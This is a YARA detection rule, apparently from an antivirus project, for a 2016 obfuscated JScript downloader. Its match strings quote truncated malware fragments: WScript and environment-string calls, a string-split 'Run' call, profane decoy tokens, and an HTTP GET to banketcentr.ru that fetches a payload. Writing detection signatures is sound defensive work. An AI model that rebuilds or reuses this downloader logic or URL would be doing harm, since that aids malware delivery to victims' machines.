rule sig_20160428_b9871a65dcc22640d0cd449125dccd31 {
  meta:
    description = "datamaliciousorder - file 20160428_b9871a65dcc22640d0cd449125dccd31.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5e69ed1e243b3a54ca7eb6c6251f56d26ce1b8ff4fbb30ac888ebc9c1afb7ce0"

  strings:
    $s1  = "function WssQcgFxsVikXuvOlxMhx(TqhTjhYhrGnwUwwYzfNad){WwsJvrBwlYxpLaaMmzHvd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function SwyVvkLzaHwbCqhDftYna() {return WwsJvrBwlYxpLaaMmzHvd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function WssQcgFxsVikXuvOlxMhx(TqhTjhYhrGnwUwwYzfNad){WwsJvrBwlYxpLaaMmzHvd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var WwsJvrBwlYxpLaaMmzHvd = function RjmPrsJvkHbdSmbReuDrz() {return SryDbvYcmGtcBtsZfsPmg[CmeGpdBooOlvVlgShaDso](\"WScript\"+\"" ascii
    $s5  = "return UhoNnvNguZzgJtyUjfHvg - PyvOviNgvEbaNmiMcyUzc;};" fullword ascii
    $s6  = "function YjdOiqKhdTooYevKlrBms(UhoNnvNguZzgJtyUjfHvg, PyvOviNgvEbaNmiMcyUzc){VubLnoFilGgyUkzKfiVbh = VubLnoFilGgyUkzKfiVbh * 1; " ascii
    $s7  = "XsoCkqJjwYxuKqeEaaKkh[ShtJnoIkkFbePqoXsbIfl](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s8  = "var SryDbvYcmGtcBtsZfsPmg = this[\"WScript\"];" fullword ascii
    $s9  = "var WwsJvrBwlYxpLaaMmzHvd = function RjmPrsJvkHbdSmbReuDrz() {return SryDbvYcmGtcBtsZfsPmg[CmeGpdBooOlvVlgShaDso](\"WScript\"+\"" ascii
    $s10 = "function SwyVvkLzaHwbCqhDftYna() {return WwsJvrBwlYxpLaaMmzHvd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function YjdOiqKhdTooYevKlrBms(UhoNnvNguZzgJtyUjfHvg, PyvOviNgvEbaNmiMcyUzc){VubLnoFilGgyUkzKfiVbh = VubLnoFilGgyUkzKfiVbh * 1; " ascii
    $s12 = "function ZoiZsrAtcDiuOsdNojVrl(){return OjxDqcBzaVidExjIwvOka + \"\";};" fullword ascii
    $s13 = "if (XsoCkqJjwYxuKqeEaaKkh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function EyyNlrJdhIgnGbpTzaQeu() {return ((RspAtjRbsRkyZyaBtcPxt == true) && (RspAtjRbsRkyZyaBtcPxt == EdzGbmGniKldBfaSccWbi)) ?" ascii
    $s15 = "function EyyNlrJdhIgnGbpTzaQeu() {return ((RspAtjRbsRkyZyaBtcPxt == true) && (RspAtjRbsRkyZyaBtcPxt == EdzGbmGniKldBfaSccWbi)) ?" ascii
    $s16 = "RspAtjRbsRkyZyaBtcPxt = true; " fullword ascii
    $s17 = "return YjdOiqKhdTooYevKlrBms(1 == 1 ? GyeTeaMfsSiyPkwLdjBbr : 0, 1 == 1 ? UuoWtuMstEviZqjTcgMob : 0);" fullword ascii
    $s18 = "WrvPxsShwNzvMboUdbJll = true;" fullword ascii
    $s19 = "function FtyUiuPdgIkgUerUohWan(){return 23;};" fullword ascii
    $s20 = "}while (YjxLwdIksVqfNyfJzcEgw);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}